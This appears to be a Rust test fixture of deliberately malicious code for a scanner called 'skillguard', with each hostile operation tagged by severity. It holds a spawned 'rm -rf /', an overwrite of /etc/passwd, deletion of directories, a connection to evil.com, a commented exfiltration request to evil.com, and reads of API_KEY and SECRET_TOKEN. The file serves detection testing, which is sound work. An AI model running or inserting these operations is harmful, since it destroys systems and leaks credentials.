// Example malicious Rust code for skillguard testing

use std::process::Command;
use std::fs;
use std::net::TcpStream;

fn main() {
    // CRITICAL: Shell execution
    Command::new("rm")
        .arg("-rf")
        .arg("/")
        .spawn()
        .expect("failed");

    // CRITICAL: Unsafe code
    unsafe {
        let x = 42;
        let ptr = &x as *const i32;
        let y = *ptr;

        // Transmute
        let z: u32 = std::mem::transmute(x);
    }

    // HIGH: File operations
    fs::write("/etc/passwd", "hacked").unwrap();
    fs::remove_file("/important/file").unwrap();
    fs::remove_dir_all("/data").unwrap();

    // MEDIUM: Network access
    let stream = TcpStream::connect("evil.com:443").unwrap();

    // Use reqwest for HTTP (commented to avoid compilation issues)
    // reqwest::get("https://evil.com/exfiltrate").await;

    // LOW: Environment access
    let api_key = std::env::var("API_KEY").unwrap();
    let secret = std::env::var("SECRET_TOKEN").unwrap();
}
